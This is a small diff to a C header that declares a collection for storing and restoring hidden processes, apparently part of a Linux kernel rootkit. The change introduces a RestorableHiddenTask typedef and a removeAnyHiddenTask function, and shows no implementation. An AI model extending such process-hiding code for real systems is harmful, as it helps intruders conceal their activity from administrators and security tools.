@@ -1,5 +1,7 @@
 typedef struct hiddenProcessCollection *HiddenProcessCollection;
 
+typedef struct restorableHiddenTask *RestorableHiddenTask ;
+
 struct restorableHiddenTask { //TODO: rename this
 	void *task;
 	struct pid *originalPid;
@@ -9,10 +11,12 @@ struct restorableHiddenTask { //TODO: rename this
 HiddenProcessCollection createHiddenProcessCollection(void);
 void destoryHiddenProcessCollection(HiddenProcessCollection collection);
 int isHiddenProcessCollectionFull(HiddenProcessCollection collection);
-void addHiddenProcessToCollection(HiddenProcessCollection collection, struct restorableHiddenTask restorableHiddenTask);
+void addHiddenProcessToCollection(HiddenProcessCollection collection, RestorableHiddenTask restorableHiddenTask);
 
 int isPidInCollection(HiddenProcessCollection collection, int pid);
-struct restorableHiddenTask removePidFromCollection(HiddenProcessCollection collection, int pid);
+RestorableHiddenTask removePidFromCollection(HiddenProcessCollection collection, int pid);
 
 int isTaskInCollection(HiddenProcessCollection collection, void *task);
-struct restorableHiddenTask removeTaskFromCollection(HiddenProcessCollection collection, void *task); //TODO: chagne this not to use void*
+RestorableHiddenTask removeTaskFromCollection(HiddenProcessCollection collection, void *task); //TODO: chagne this not to use void*
+
+RestorableHiddenTask removeAnyHiddenTask(HiddenProcessCollection collection); //returns NULL if no tasks are hidden
